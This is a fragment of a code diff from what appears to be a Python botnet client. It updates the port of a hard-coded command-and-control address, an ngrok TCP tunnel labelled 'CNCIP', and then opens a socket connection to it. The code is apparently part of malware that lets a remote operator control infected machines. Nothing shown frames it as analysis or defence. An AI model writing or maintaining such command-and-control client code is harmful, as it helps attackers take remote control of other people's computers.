@@ -12,7 +12,7 @@ def msgrec(conn):
         if not msg.decode('utf-8') == '\r\n':break
     return msg.decode('UTF-8').strip()
 CNCIP = "0.tcp.ap.ngrok.io"
-CNCPORT = 16889
+CNCPORT = 15077
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.connect((CNCIP,CNCPORT))
 
